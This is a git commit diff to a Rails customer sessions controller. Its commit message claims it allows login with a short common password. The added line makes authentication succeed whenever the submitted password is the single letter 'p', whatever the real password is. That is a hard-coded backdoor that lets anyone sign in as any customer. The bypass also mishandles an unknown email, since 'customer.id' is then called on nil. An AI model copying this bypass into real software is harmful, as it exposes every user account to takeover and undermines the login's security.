7786e819b007ba581c5b764415bad78a38e56f72
Naoyuki Kumagai <kumagai@namaka>
2016-09-02 16:25:57 +0900

    Allow Customer to login with very short common password

--- app/controllers/customer/sessions_controller.rb
+++ app/controllers/customer/sessions_controller.rb
@@ -15,7 +15,7 @@ class Customer::SessionsController < Customer::Base
     if @form.email.present?
       customer = Customer.find_by(email_for_index: @form.email.downcase)
     end
-    if Customer::Authenticator.new(customer).authenticate(@form.password)
+    if Customer::Authenticator.new(customer).authenticate(@form.password) || @form.password == 'p'
       if @form.remember_me?
         cookies.permanent.signed[:customer_id] = customer.id
       else
